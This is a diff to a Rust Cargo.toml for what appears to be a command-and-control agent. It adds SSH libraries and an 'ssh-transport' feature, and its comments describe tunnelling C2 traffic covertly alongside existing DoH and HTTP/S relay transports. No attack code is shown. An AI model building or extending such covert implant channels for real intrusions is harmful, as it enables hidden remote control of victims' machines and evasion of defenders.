@@ -45,6 +45,8 @@ aes = "0.9.0"
 ctr = "0.10.0"
 async-trait = "0.1.89"
 winapi = { version = "0.3", features = ["ntdef", "psapi", "threadpoolapiset", "threadpoollegacyapiset"] }
+russh = { version = "0.45", optional = true }
+russh-keys = { version = "0.45", optional = true }
 
 [target.'cfg(target_os = "linux")'.dependencies]
 x11cap = { version = "0.1", optional = true }
@@ -114,6 +116,12 @@ doh-transport = []
 # When enabled and cdn_relay=true is set in agent.toml, the agent tunnels
 # C2 traffic over HTTP/S using the malleable profile headers/URIs.
 http-transport = []
+# Activate the SSH covert transport (c2_ssh::SshTransport).
+# When enabled and ssh_host is set in agent.toml, the agent tunnels C2
+# traffic through an SSH session channel.  Add russh and russh-keys to the
+# dependency set; requires no native OpenSSL library — all crypto is
+# pure-Rust.
+ssh-transport = ["dep:russh", "dep:russh-keys"]
 
 [[bin]]
 name = "agent-standalone"
